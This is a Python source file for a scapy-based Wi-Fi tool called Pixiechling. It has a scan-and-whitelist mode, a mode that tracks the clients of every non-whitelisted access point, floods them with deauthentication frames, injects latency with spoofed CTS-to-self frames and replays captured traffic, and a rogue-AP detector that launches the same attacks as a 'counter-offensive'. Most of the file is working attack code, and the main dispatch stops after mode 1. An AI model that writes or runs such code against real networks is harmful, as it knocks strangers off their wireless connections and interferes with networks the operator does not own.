# coding=utf-8

import os
import sys
import json
import time
import signal
import argparse
import subprocess
import configparser
import threading
from collections import deque, defaultdict

from termcolor import colored
from argparse import RawTextHelpFormatter
from scapy.all import sniff
from scapy.sendrecv import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, RadioTap

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


banner_intro = """

██████╗ ██╗██╗  ██╗██╗███████╗ ██████╗██╗  ██╗██╗     ██╗███╗   ██╗ ██████╗
██╔══██╗██║╚██╗██╔╝██║██╔════╝██╔════╝██║  ██║██║     ██║████╗  ██║██╔════╝
██████╔╝██║ ╚███╔╝ ██║█████╗  ██║     ███████║██║     ██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██║ ██╔██╗ ██║██╔══╝  ██║     ██╔══██║██║     ██║██║╚██╗██║██║   ██║
██║     ██║██╔╝ ██╗██║███████╗╚██████╗██║  ██║███████╗██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝

----------------------------------------------------------------------
"""

WHITELIST_FILE = "pixiechling_whitelist.json"
CONFIG_FILE = "pixiechling.conf"

CHANNELS_24 = list(range(1, 14))
CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
RELAY_FILE = "pixiechling_relays.json"

DESCRIPTION = """
Pixiechling - WiFi Traffic Capture & Replay Tool

Modes:

  1 : Scan BSSIDs and select whitelist
  2 : Capture/replay + client tracking + deauth + latency injection
  3 : Rogue AP detection (SSID spoofing & BSSID cloning alerts)
----------------------------------------------------------------------
"""


def load_config(config_path):
    config = configparser.ConfigParser()
    if not os.path.isfile(config_path):
        print(colored("[!] Config file not found: " + config_path, "red"))
        sys.exit(1)
    config.read(config_path)
    capture_iface = config.get("interfaces", "capture")
    replay_iface = config.get("interfaces", "replay")
    return capture_iface, replay_iface


def check_interface(iface):
    """Verify that the interface exists and is in monitor mode.
    Offer to enable monitor mode if it is not."""
    # Check interface exists
    result = subprocess.run(
        ["iwconfig", iface],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        print(colored("[!] Interface '{}' not found.".format(iface), "red"))
        print(colored("[!] Available wireless interfaces:", "red"))
        subprocess.run(["iwconfig"], check=False)
        sys.exit(1)

    # Check monitor mode
    if "Mode:Monitor" in result.stdout:
        print(colored("[+] {} is in Monitor mode.".format(iface), "green"))
        return

    print(colored("[!] {} is NOT in Monitor mode.".format(iface), "red"))
    answer = input(colored("[?] Enable monitor mode on {}? [y/N] ".format(iface), "cyan")).strip().lower()
    if answer == "y":
        print(colored("[*] Enabling monitor mode on {} ...".format(iface), "cyan"))
        subprocess.run(["ip", "link", "set", iface, "down"], check=False)
        subprocess.run(["iwconfig", iface, "mode", "monitor"], check=False)
        subprocess.run(["ip", "link", "set", iface, "up"], check=False)
        # Verify
        verify = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
        if "Mode:Monitor" in verify.stdout:
            print(colored("[+] {} is now in Monitor mode.".format(iface), "green"))
        else:
            print(colored("[!] Failed to enable monitor mode. Try manually: airmon-ng start {}".format(iface), "red"))
            sys.exit(1)
    else:
        print(colored("[!] Aborted. Enable monitor mode first.", "red"))
        sys.exit(1)


def load_whitelist():
    """Load whitelist. Supports multiple formats:
    - New: {bssid: {"ssid": ..., "channel": ...}}  (dict of dicts)
    - Mid: {bssid: ssid, ...}                       (dict of strings)
    - Old: [bssid, ...]                              (list)"""
    if not os.path.isfile(WHITELIST_FILE):
        return {}
    with open(WHITELIST_FILE, "r") as f:
        data = json.load(f)
    if isinstance(data, list):
        return {b: {"ssid": "<unknown>", "channel": None} for b in data}
    # Check if values are dicts (new format) or strings (mid format)
    result = {}
    for bssid, val in data.items():
        if isinstance(val, dict):
            result[bssid] = val
        else:
            result[bssid] = {"ssid": val, "channel": None}
    return result


def save_whitelist(whitelist):
    """Save whitelist as {bssid: {"ssid": ..., "channel": ...}} dict."""
    with open(WHITELIST_FILE, "w") as f:
        json.dump(whitelist, f, indent=2)


# ──────────────────────────────────────────────
#  Mode 1 : Scan & whitelist selection
# ──────────────────────────────────────────────

def scan_bssids(capture_iface, scan_time=30, use_5ghz=False):
    """Scan channels and collect unique BSSIDs with their SSIDs and channels."""
    channels = CHANNELS_24 + CHANNELS_5 if use_5ghz else CHANNELS_24
    discovered = {}  # bssid -> {"ssid": str, "channel": int}
    current_ch = [1]

    def _handle_beacon(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt.addr2
            try:
                ssid = pkt.info.decode("utf-8", errors="ignore")
            except Exception:
                ssid = "<hidden>"
            if not ssid:
                ssid = "<hidden>"
            if bssid not in discovered:
                discovered[bssid] = {"ssid": ssid, "channel": current_ch[0]}
                print(colored("    [+] New AP: {} ({}) on ch {}".format(
                    bssid, ssid, current_ch[0]), "green"))

    per_channel = max(1, scan_time / len(channels))
    band = "2.4 GHz + 5 GHz" if use_5ghz else "2.4 GHz"
    total_ch = len(channels)
    print(colored("[*] Scanning BSSIDs on {} ({} ch, {} s) ...".format(band, total_ch, scan_time), "cyan"))
    for i, ch in enumerate(channels, start=1):
        current_ch[0] = ch
        print(colored("    [ch {}/{}] Scanning channel {} ...".format(i, total_ch, ch), "white"), end="\r")
        ret = subprocess.run(
            ["iw", "dev", capture_iface, "set", "channel", str(ch)],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if ret.returncode != 0:
            print(colored("    [ch {}/{}] Channel {} — skipped (unsupported)".format(i, total_ch, ch), "yellow"))
            continue
        sniff(iface=capture_iface, count=10, timeout=per_channel, prn=_handle_beacon)

    print(colored("[*] Scan complete: {} AP(s) discovered.".format(len(discovered)), "cyan"))
    return discovered


def mode_scan_whitelist(capture_iface, scan_time=30, use_5ghz=False):
    """Interactive mode: display BSSIDs, let user pick whitelist entries."""
    discovered = scan_bssids(capture_iface, scan_time, use_5ghz)

    if not discovered:
        print(colored("[!] No BSSIDs found. Make sure the interface is in monitor mode.", "red"))
        return

    # Display table
    bssid_list = sorted(discovered.items(), key=lambda x: x[1]["ssid"])
    print("\n" + colored(" #   BSSID               SSID                    CH", "yellow"))
    print(colored(" " + "-" * 60, "yellow"))
    for idx, (bssid, info) in enumerate(bssid_list, start=1):
        print(" {:<4} {}   {:<24} {}".format(idx, bssid, info["ssid"], info["channel"]))

    print()
    print(colored("[?] Enter BSSID numbers to whitelist (comma-separated), or 'all':", "cyan"))
    selection = input(">>> ").strip()

    if selection.lower() == "all":
        chosen = [b for b, _ in bssid_list]
    else:
        chosen = []
        for part in selection.split(","):
            part = part.strip()
            if part.isdigit():
                idx = int(part)
                if 1 <= idx <= len(bssid_list):
                    chosen.append(bssid_list[idx - 1][0])
                else:
                    print(colored("[!] Skipping invalid index: " + part, "red"))
            else:
                print(colored("[!] Skipping non-numeric input: " + part, "red"))

    if not chosen:
        print(colored("[!] No valid BSSIDs selected.", "red"))
        return

    # Save as {bssid: {"ssid": ..., "channel": ...}} mapping
    whitelist_dict = {b: discovered[b] for b in chosen}
    save_whitelist(whitelist_dict)
    print(colored("[+] Whitelist saved ({} BSSIDs):".format(len(chosen)), "green"))
    for b in chosen:
        info = discovered[b]
        print("    {} ({}) ch={}".format(b, info["ssid"], info["channel"]))


# ──────────────────────────────────────────────
#  Mode 2 : Capture / Replay loop
# ──────────────────────────────────────────────

class ReplayBuffer:
    """Thread-safe rolling buffer that keeps packets from the last `window` seconds,
    along with their capture timestamp and channel."""

    def __init__(self, window=15):
        self.window = window
        self.lock = threading.Lock()
        self.packets = deque()

    def add(self, pkt, channel):
        now = time.time()
        with self.lock:
            self.packets.append((now, channel, pkt))
            self._prune(now)

    def get_packets(self):
        """Return list of (capture_ts, channel, pkt) in chronological order."""
        now = time.time()
        with self.lock:
            self._prune(now)
            return [(ts, ch, pkt) for ts, ch, pkt in self.packets]

    def _prune(self, now):
        while self.packets and (now - self.packets[0][0]) > self.window:
            self.packets.popleft()


def mode_replay(capture_iface, replay_iface, use_5ghz=False):
    """Capture traffic on iface0, track clients of non-whitelisted BSSIDs,
    replay frames on iface1, inject latency via CTS-to-self flooding,
    and deauth clients from target BSSIDs — all simultaneously."""

    channels = CHANNELS_24 + CHANNELS_5 if use_5ghz else CHANNELS_24

    whitelist = load_whitelist()
    if not whitelist:
        print(colored("[!] No whitelist found. Run mode 1 first.", "red"))
        sys.exit(1)

    whitelist_set = set(b.lower() for b in whitelist.keys())
    buf = ReplayBuffer(window=15)
    stop_event = threading.Event()

    # Client tracking state (shared with capture thread)
    ap_clients = {}
    clients_lock = threading.Lock()

    def _on_sigint(sig, frame):
        print(colored("\n[*] Stopping ...", "yellow"))
        stop_event.set()

    signal.signal(signal.SIGINT, _on_sigint)

    print(colored("[+] Whitelist loaded ({} BSSIDs) \u2014 these will be EXCLUDED:".format(len(whitelist)), "green"))
    for b, info in whitelist.items():
        print("    {} ({}) ch={}".format(b, info["ssid"], info.get("channel", "?")))
    print(colored("[*] Capture iface : " + capture_iface, "cyan"))
    print(colored("[*] Replay  iface : " + replay_iface, "cyan"))
    print(colored("[*] Channels      : {} ({} ch)".format(
        "2.4 GHz + 5 GHz" if use_5ghz else "2.4 GHz only", len(channels)), "cyan"))
    print(colored("[*] Starting capture/replay + deauth + latency injection (Ctrl+C to stop) ...", "cyan"))
    print()

    # ── Capture thread ──
    current_channel = [1]

    def capture_loop():
        def _handle_pkt(pkt):
            if stop_event.is_set():
                return
            if not pkt.haslayer(Dot11):
                return
            dot11 = pkt.getlayer(Dot11)
            addrs = [
                (dot11.addr1 or "").lower(),
                (dot11.addr2 or "").lower(),
                (dot11.addr3 or "").lower(),
            ]

            # ---- Client tracking (real-time) ----
            if pkt.haslayer(Dot11Beacon):
                bssid = addrs[1]  # addr2
                if bssid and bssid not in whitelist_set:
                    try:
                        ssid = pkt.info.decode("utf-8", errors="ignore") or "<hidden>"
                    except Exception:
                        ssid = "<hidden>"
                    with clients_lock:
                        if bssid not in ap_clients:
                            ap_clients[bssid] = {"ssid": ssid, "clients": set()}
                        elif ap_clients[bssid]["ssid"] == "<hidden>" and ssid != "<hidden>":
                            ap_clients[bssid]["ssid"] = ssid
            else:
                addr1, addr2, addr3 = addrs
                bssid, client = None, None
                if addr3 and addr3 not in whitelist_set and addr3 != "ff:ff:ff:ff:ff:ff":
                    bssid = addr3
                    if addr2 != bssid:
                        client = addr2
                    elif addr1 != bssid and addr1 != "ff:ff:ff:ff:ff:ff":
                        client = addr1
                if bssid and client and client != "ff:ff:ff:ff:ff:ff":
                    with clients_lock:
                        if bssid not in ap_clients:
                            ap_clients[bssid] = {"ssid": "<unknown>", "clients": set()}
                        if client not in ap_clients[bssid]["clients"]:
                            ap_clients[bssid]["clients"].add(client)
                            ssid = ap_clients[bssid]["ssid"]
                            print(colored("  [+] New client: ", "green") +
                                  colored(client, "white") +
                                  colored(" \u2192 ", "yellow") +
                                  colored("{} ({})".format(bssid, ssid), "cyan"))

            # ---- Buffer for replay (exclude whitelisted) ----
            if not (whitelist_set & set(addrs)):
                buf.add(pkt, current_channel[0])

        while not stop_event.is_set():
            for ch in channels:
                if stop_event.is_set():
                    return
                current_channel[0] = ch
                subprocess.run(
                    ["iw", "dev", capture_iface, "set", "channel", str(ch)],
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                sniff(iface=capture_iface, timeout=1, prn=_handle_pkt)

    cap_thread = threading.Thread(target=capture_loop, daemon=True)
    cap_thread.start()

    # ── Deauth thread ──
    def deauth_loop():
        """Continuously send deauth frames between non-whitelisted BSSIDs
        and their detected clients."""
        while not stop_event.is_set():
            with clients_lock:
                targets = [
                    (bssid, list(info["clients"]))
                    for bssid, info in ap_clients.items()
                    if info["clients"]
                ]
            if not targets:
                time.sleep(2)
                continue

            for bssid, clients in targets:
                if stop_event.is_set():
                    return
                for client in clients:
                    if stop_event.is_set():
                        return
                    # Deauth client from BSSID  (AP → client)
                    deauth_ap = RadioTap() / Dot11(
                        addr1=client, addr2=bssid, addr3=bssid
                    ) / Dot11Deauth(reason=7)
                    # Deauth BSSID from client  (client → AP)
                    deauth_cl = RadioTap() / Dot11(
                        addr1=bssid, addr2=client, addr3=bssid
                    ) / Dot11Deauth(reason=7)
                    try:
                        sendp(deauth_ap, iface=replay_iface, count=3, inter=0.02, verbose=False)
                        sendp(deauth_cl, iface=replay_iface, count=3, inter=0.02, verbose=False)
                    except Exception:
                        pass
            time.sleep(1)

    deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
    deauth_thread.start()

    # ── Latency injection thread ──
    def latency_loop():
        """Flood CTS-to-self frames spoofed from target BSSIDs to force
        surrounding stations into NAV wait (Network Allocation Vector),
        which injects real latency into BSSID ↔ client exchanges."""
        while not stop_event.is_set():
            with clients_lock:
                bssids = list(ap_clients.keys())
            if not bssids:
                time.sleep(2)
                continue

            for bssid in bssids:
                if stop_event.is_set():
                    return
                # CTS frame: addr1 = BSSID (spoofed as if BSSID reserved the medium)
                # duration = 30000 µs → forces other stations to wait ~30 ms
                cts = RadioTap() / Dot11(
                    type=1, subtype=12,
                    addr1=bssid,
                    ID=30000,
                )
                try:
                    sendp(cts, iface=replay_iface, count=5, inter=0.01, verbose=False)
                except Exception:
                    pass
            time.sleep(0.5)

    latency_thread = threading.Thread(target=latency_loop, daemon=True)
    latency_thread.start()

    # ── Replay + summary loop (main thread) ──
    # Track last seen SC per source MAC so replay continues coherently
    sc_tracker = {}  # source_mac -> last_seen_sc (0..4095)

    while not stop_event.is_set():
        time.sleep(15)

        # -- Client summary --
        with clients_lock:
            total_aps = len(ap_clients)
            total_clients = sum(len(v["clients"]) for v in ap_clients.values())
        print(colored(
            "\n[*] Client summary: {} non-whitelisted APs, {} clients".format(total_aps, total_clients),
            "yellow",
        ))
        with clients_lock:
            for bssid, info in sorted(ap_clients.items()):
                print(colored("  AP {} ({})".format(bssid, info["ssid"]), "cyan") +
                      colored(" \u2014 {} client(s)".format(len(info["clients"])), "white"))
                for c in sorted(info["clients"]):
                    print("      \u2514\u2500 " + c)

        # -- Replay --
        packets = buf.get_packets()
        if not packets:
            print(colored("[*] Replay buffer empty, waiting ...", "yellow"))
            continue

        # Update SC tracker from captured traffic (learn current flow state)
        for _, _, pkt in packets:
            if pkt.haslayer(Dot11):
                dot11 = pkt.getlayer(Dot11)
                src = (dot11.addr2 or "").lower()
                if src and src != "ff:ff:ff:ff:ff:ff" and dot11.SC is not None:
                    sc_tracker[src] = (dot11.SC >> 4) & 0xFFF

        # Group by channel, preserving chronological order within each channel
        by_channel = defaultdict(list)
        for ts, ch, pkt in packets:
            by_channel[ch].append((ts, pkt))

        total = len(packets)
        print(colored("[>] Replaying {} packets across {} channel(s) on {} ...".format(
            total, len(by_channel), replay_iface), "green"))

        for ch in sorted(by_channel.keys()):
            if stop_event.is_set():
                break
            subprocess.run(
                ["iw", "dev", replay_iface, "set", "channel", str(ch)],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            ch_packets = by_channel[ch]
            prev_ts = ch_packets[0][0]

            for ts, pkt in ch_packets:
                if stop_event.is_set():
                    break

                # Respect original inter-packet timing
                delay = ts - prev_ts
                if delay > 0:
                    time.sleep(delay)
                prev_ts = ts

                # Assign next SC for this source MAC
                if pkt.haslayer(Dot11):
                    dot11 = pkt.getlayer(Dot11)
                    src = (dot11.addr2 or "").lower()
                    if src and src != "ff:ff:ff:ff:ff:ff":
                        next_sc = (sc_tracker.get(src, 0) + 1) % 4096
                        sc_tracker[src] = next_sc
                        dot11.SC = next_sc << 4
                try:
                    sendp(pkt, iface=replay_iface, verbose=False)
                except Exception as e:
                    print(colored("[!] Replay error: " + str(e), "red"))
                    break

    cap_thread.join(timeout=5)
    deauth_thread.join(timeout=3)
    latency_thread.join(timeout=3)
    print(colored("[*] Pixiechling stopped.", "yellow"))


# ──────────────────────────────────────────────
#  Mode 3 : Rogue AP detection
# ──────────────────────────────────────────────

def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
    """Monitor for rogue APs:
    - SSID spoofing: another BSSID broadcasts the same SSID as a whitelisted AP
      → immediate counter-offensive: deauth + CTS-to-self latency injection
    - BSSID cloning: same BSSID seen from different signal/channel than expected
    - Relay/repeater detection
    """

    channels = CHANNELS_24 + CHANNELS_5 if use_5ghz else CHANNELS_24

    whitelist = load_whitelist()
    if not whitelist:
        print(colored("[!] No whitelist found. Run mode 1 first.", "red"))
        sys.exit(1)

    # Build lookup structures
    wl_bssids = set(b.lower() for b in whitelist.keys())
    wl_ssids = {}  # ssid -> set of legitimate bssids
    wl_channels = {}  # bssid -> expected channel (from whitelist)
    for bssid, info in whitelist.items():
        ssid = info["ssid"]
        ssid_lower = ssid.lower()
        if ssid_lower not in wl_ssids:
            wl_ssids[ssid_lower] = set()
        wl_ssids[ssid_lower].add(bssid.lower())
        if info.get("channel") is not None:
            wl_channels[bssid.lower()] = info["channel"]

    # Track what we've already alerted on to avoid spam
    alerted_spoof = set()   # (rogue_bssid, ssid)
    alerted_clone = set()   # (bssid, channel)
    # Track first-seen channel per BSSID for clone detection (fallback)
    bssid_channels = {}     # bssid -> first_seen_channel
    # Relay/repeater tracking
    beacon_bssids = {}      # bssid -> ssid (all BSSIDs seen in beacons)
    relays = {}             # relay_bssid -> {upstream_bssid: upstream_ssid}
    alerted_relay = set()   # (relay_bssid, upstream_bssid)
    # Counter-offensive: track rogue spoof BSSIDs and their clients
    rogue_bssids = set()    # BSSIDs detected as SSID spoofers
    rogue_clients = {}      # rogue_bssid -> {"ssid": str, "clients": set()}
    rogue_lock = threading.Lock()
    lock = threading.Lock()
    stop_event = threading.Event()

    def _on_sigint(sig, frame):
        print(colored("\n[*] Stopping ...", "yellow"))
        stop_event.set()

    signal.signal(signal.SIGINT, _on_sigint)

    print(colored("[+] Whitelist loaded ({} BSSIDs):".format(len(whitelist)), "green"))
    for b, info in whitelist.items():
        print("    {} ({}) ch={}".format(b, info["ssid"], info.get("channel", "?")))
    print(colored("[*] Protected SSIDs: {}".format(
        ", ".join(s for s in wl_ssids.keys() if s != "<unknown>")), "cyan"))
    print(colored("[*] Channels      : {} ({} ch)".format(
        "2.4 GHz + 5 GHz" if use_5ghz else "2.4 GHz only", len(channels)), "cyan"))
    print(colored("[*] Replay iface  : {} (counter-offensive on SSID spoof + evil twin)".format(replay_iface), "cyan"))
    print(colored("[*] Monitoring for rogue APs + signal relays (Ctrl+C to stop) ...", "cyan"))
    print()

    current_channel = [1]

    def _save_relays():
        """Save detected relay network to JSON file."""
        data = {}
        for r_bssid, upstreams in relays.items():
            data[r_bssid] = {
                "ssid": beacon_bssids.get(r_bssid, "<unknown>"),
                "upstream": dict(upstreams),
            }
        with open(RELAY_FILE, "w") as f:
            json.dump(data, f, indent=2)

    def _handle_pkt(pkt):
        if stop_event.is_set():
            return

        # ── Beacon processing: SSID spoofing, BSSID cloning, BSSID tracking ──
        if pkt.haslayer(Dot11Beacon):
            bssid = (pkt.addr2 or "").lower()
            if not bssid:
                return
            try:
                ssid = pkt.info.decode("utf-8", errors="ignore") or ""
            except Exception:
                ssid = ""

            ssid_lower = ssid.lower()
            ch = current_channel[0]

            with lock:
                # Track all beacon BSSIDs for relay detection
                if bssid not in beacon_bssids:
                    beacon_bssids[bssid] = ssid or "<hidden>"

                # ── Check 1: SSID spoofing ──
                if ssid_lower in wl_ssids and bssid not in wl_bssids:
                    alert_key = (bssid, ssid_lower)
                    if alert_key not in alerted_spoof:
                        alerted_spoof.add(alert_key)
                        rogue_bssids.add(bssid)
                        legit = ", ".join(wl_ssids[ssid_lower])
                        print(colored(
                            "\n  [!!!] SSID SPOOFING DETECTED", "red", attrs=["bold", "reverse"]))
                        print(colored(
                            "        Rogue BSSID : {}".format(bssid), "red", attrs=["bold"]))
                        print(colored(
                            "        Spoofed SSID: {}".format(ssid), "red", attrs=["bold"]))
                        print(colored(
                            "        Legit BSSID : {}".format(legit), "green"))
                        print(colored(
                            "        Channel     : {}".format(ch), "yellow"))
                        print(colored(
                            "        Time        : {}".format(time.strftime("%c")), "yellow"))
                        print(colored(
                            "        [>>>] COUNTER-OFFENSIVE ENGAGED", "red", attrs=["bold"]))
                        print()
                # \u2500\u2500 Check 2: BSSID cloning \u2500\u2500
                if bssid in wl_bssids:
                    expected_ch = wl_channels.get(bssid)
                    if expected_ch is None:
                        # Fallback: use first-seen channel
                        if bssid not in bssid_channels:
                            bssid_channels[bssid] = ch
                        expected_ch = bssid_channels[bssid]
                    if ch != expected_ch:
                        alert_key = (bssid, ch)
                        if alert_key not in alerted_clone:
                            alerted_clone.add(alert_key)
                            # Add to rogue targets for counter-offensive
                            rogue_bssids.add(bssid)
                            print(colored(
                                "\n  [!!!] BSSID CLONE / EVIL TWIN DETECTED", "red", attrs=["bold", "reverse"]))
                            print(colored(
                                "        BSSID       : {}".format(bssid), "red", attrs=["bold"]))
                            print(colored(
                                "        SSID        : {}".format(ssid), "red", attrs=["bold"]))
                            print(colored(
                                "        Expected ch : {}".format(expected_ch), "green"))
                            print(colored(
                                "        Seen on ch  : {}".format(ch), "red", attrs=["bold"]))
                            print(colored(
                                "        Time        : {}".format(time.strftime("%c")), "yellow"))
                            print(colored(
                                "        [>>>] COUNTER-OFFENSIVE ENGAGED", "red", attrs=["bold"]))
                            print()

        # ── Data frame processing: relay/repeater detection + rogue client tracking ──
        if pkt.haslayer(Dot11):
            dot11 = pkt.getlayer(Dot11)

            # ── Client tracking for rogue spoof BSSIDs ──
            addr1 = (dot11.addr1 or "").lower()
            addr2 = (dot11.addr2 or "").lower()
            addr3 = (dot11.addr3 or "").lower()

            with lock:
                target_bssid = None
                client_mac = None
                # Check if any address is a rogue BSSID
                if addr3 in rogue_bssids and addr3 != "ff:ff:ff:ff:ff:ff":
                    target_bssid = addr3
                    if addr2 != target_bssid:
                        client_mac = addr2
                    elif addr1 != target_bssid and addr1 != "ff:ff:ff:ff:ff:ff":
                        client_mac = addr1
                elif addr2 in rogue_bssids:
                    target_bssid = addr2
                    if addr1 != target_bssid and addr1 != "ff:ff:ff:ff:ff:ff":
                        client_mac = addr1

                if target_bssid and client_mac and client_mac != "ff:ff:ff:ff:ff:ff":
                    with rogue_lock:
                        if target_bssid not in rogue_clients:
                            rogue_clients[target_bssid] = {
                                "ssid": beacon_bssids.get(target_bssid, "<unknown>"),
                                "clients": set(),
                            }
                        if client_mac not in rogue_clients[target_bssid]["clients"]:
                            rogue_clients[target_bssid]["clients"].add(client_mac)
                            r_ssid = rogue_clients[target_bssid]["ssid"]
                            print(colored("  [+] Rogue client: ", "red") +
                                  colored(client_mac, "white") +
                                  colored(" → ", "yellow") +
                                  colored("{} ({})".format(target_bssid, r_ssid), "red"))

            # ── Relay/repeater detection (data frames only) ──
            if dot11.type == 2:
                ds_bits = dot11.FCfield & 0x3

                with lock:
                    relay_bssid = None
                    upstream_bssid = None

                    # ToDS: addr1=BSSID(AP), addr2=SA(client)
                    # If addr2 is a known AP acting as client → relay
                    if ds_bits == 0x1:
                        if (addr2 in beacon_bssids and addr1 in beacon_bssids
                                and addr2 != addr1):
                            relay_bssid = addr2
                            upstream_bssid = addr1
                    # WDS (ToDS+FromDS): addr2=TA, addr1=RA — direct relay evidence
                    elif ds_bits == 0x3:
                        if (addr2 in beacon_bssids and addr1 in beacon_bssids
                                and addr2 != addr1):
                            relay_bssid = addr2
                            upstream_bssid = addr1

                    if relay_bssid and upstream_bssid:
                        alert_key = (relay_bssid, upstream_bssid)
                        if alert_key not in alerted_relay:
                            alerted_relay.add(alert_key)
                            if relay_bssid not in relays:
                                relays[relay_bssid] = {}
                            relays[relay_bssid][upstream_bssid] = beacon_bssids.get(
                                upstream_bssid, "<unknown>")

                            r_ssid = beacon_bssids.get(relay_bssid, "<unknown>")
                            u_ssid = beacon_bssids.get(upstream_bssid, "<unknown>")
                            print(colored(
                                "\n  [!!!] SIGNAL RELAY / REPEATER DETECTED",
                                "magenta", attrs=["bold", "reverse"]))
                            print(colored(
                                "        Relay BSSID   : {} ({})".format(
                                    relay_bssid, r_ssid), "magenta", attrs=["bold"]))
                            print(colored(
                                "        Upstream BSSID: {} ({})".format(
                                    upstream_bssid, u_ssid), "cyan", attrs=["bold"]))
                            print(colored(
                                "        Channel       : {}".format(
                                    current_channel[0]), "yellow"))
                            print(colored(
                                "        Time          : {}".format(
                                    time.strftime("%c")), "yellow"))
                            print()
                            _save_relays()

    # ── Capture thread ──
    def capture_loop():
        while not stop_event.is_set():
            for ch in channels:
                if stop_event.is_set():
                    return
                current_channel[0] = ch
                subprocess.run(
                    ["iw", "dev", capture_iface, "set", "channel", str(ch)],
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                sniff(iface=capture_iface, timeout=2, prn=_handle_pkt)

    cap_thread = threading.Thread(target=capture_loop, daemon=True)
    cap_thread.start()

    # ── Deauth thread (counter-offensive on rogue spoof BSSIDs) ──
    def deauth_loop():
        """Continuously deauth clients from rogue BSSIDs (SSID spoof + evil twin)."""
        while not stop_event.is_set():
            with rogue_lock:
                targets = [
                    (bssid, list(info["clients"]))
                    for bssid, info in rogue_clients.items()
                    if info["clients"]
                ]
            if not targets:
                time.sleep(2)
                continue

            for bssid, clients in targets:
                if stop_event.is_set():
                    return
                for client in clients:
                    if stop_event.is_set():
                        return
                    deauth_ap = RadioTap() / Dot11(
                        addr1=client, addr2=bssid, addr3=bssid
                    ) / Dot11Deauth(reason=7)
                    deauth_cl = RadioTap() / Dot11(
                        addr1=bssid, addr2=client, addr3=bssid
                    ) / Dot11Deauth(reason=7)
                    try:
                        sendp(deauth_ap, iface=replay_iface, count=3, inter=0.02, verbose=False)
                        sendp(deauth_cl, iface=replay_iface, count=3, inter=0.02, verbose=False)
                    except Exception:
                        pass
            time.sleep(1)

    deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
    deauth_thread.start()

    # ── Latency injection thread (CTS-to-self on rogue spoof BSSIDs) ──
    def latency_loop():
        """Flood CTS-to-self frames spoofed from rogue BSSIDs to inject
        latency into their client communications."""
        while not stop_event.is_set():
            with lock:
                targets = list(rogue_bssids)
            if not targets:
                time.sleep(2)
                continue

            for bssid in targets:
                if stop_event.is_set():
                    return
                cts = RadioTap() / Dot11(
                    type=1, subtype=12,
                    addr1=bssid,
                    ID=30000,
                )
                try:
                    sendp(cts, iface=replay_iface, count=5, inter=0.01, verbose=False)
                except Exception:
                    pass
            time.sleep(0.5)

    latency_thread = threading.Thread(target=latency_loop, daemon=True)
    latency_thread.start()

    # ── Summary loop (main thread) ──
    while not stop_event.is_set():
        time.sleep(15)
        with lock:
            spoof_count = len(alerted_spoof)
            clone_count = len(alerted_clone)
            relay_count = len(alerted_relay)
            relay_snapshot = {r: dict(u) for r, u in relays.items()}
            bssid_names = dict(beacon_bssids)
        total_alerts = spoof_count + clone_count + relay_count
        with rogue_lock:
            rogue_count = len(rogue_bssids)
            rogue_client_count = sum(len(v["clients"]) for v in rogue_clients.values())
            rogue_snapshot = {
                b: {"ssid": info["ssid"], "clients": list(info["clients"])}
                for b, info in rogue_clients.items()
            }
        print(colored(
            "\n[*] Status: {} SSID spoof(s), {} BSSID clone(s), {} relay(s) detected".format(
                spoof_count, clone_count, relay_count),
            "yellow" if total_alerts == 0 else "red",
        ))
        if rogue_count:
            print(colored(
                "[*] Counter-offensive: {} rogue AP(s), {} client(s) under deauth + latency".format(
                    rogue_count, rogue_client_count),
                "red", attrs=["bold"],
            ))
            for r_bssid, info in sorted(rogue_snapshot.items()):
                print(colored("    Rogue AP {} ({})".format(r_bssid, info["ssid"]), "red") +
                      colored(" — {} client(s)".format(len(info["clients"])), "white"))
                for c in sorted(info["clients"]):
                    print("        └─ " + c)
        if relay_snapshot:
            print(colored("  Relay network map:", "magenta", attrs=["bold"]))
            for r_bssid, upstreams in sorted(relay_snapshot.items()):
                r_ssid = bssid_names.get(r_bssid, "<unknown>")
                for u_bssid, u_ssid in sorted(upstreams.items()):
                    print(colored(
                        "    {} ({})  \u2192  {} ({})".format(
                            r_bssid, r_ssid, u_bssid, u_ssid), "magenta"))

    cap_thread.join(timeout=5)
    deauth_thread.join(timeout=3)
    latency_thread.join(timeout=3)
    print(colored("[*] Pixiechling stopped.", "yellow"))


# ──────────────────────────────────────────────
#  Main
# ──────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        "Pixiechling",
        description=DESCRIPTION,
        formatter_class=RawTextHelpFormatter,
    )
    parser.add_argument(
        "-m", "--mode",
        required=True,
        choices=["1", "2", "3"],
        help="1 = Scan & whitelist  |  2 = Capture/replay + deauth  |  3 = Rogue AP detection",
    )
    parser.add_argument(
        "-c", "--config",
        default=CONFIG_FILE,
        help="Path to config file (default: pixiechling.conf)",
    )
    parser.add_argument(
        "-t", "--scan-time",
        type=int,
        default=30,
        dest="scan_time",
        help="Scan duration in seconds for mode 1 (default: 30)",
    )
    parser.add_argument(
        "-5", "--5ghz",
        action="store_true",
        default=False,
        dest="use_5ghz",
        help="Include 5 GHz channels (36-165) in modes 1, 2 and 3",
    )
    args = parser.parse_args()

    capture_iface, replay_iface = load_config(args.config)

    print(banner_intro)
    print(colored("[*] Config loaded", "cyan"))
    print(colored("[*] Capture interface (0) : " + capture_iface, "cyan"))
    print(colored("[*] Replay  interface (1) : " + replay_iface, "cyan"))
    print()

    if args.mode == "1":
        check_interface(capture_iface)
        mode_scan_whitelist(capture_iface, args.scan_time, args.use_5ghz)
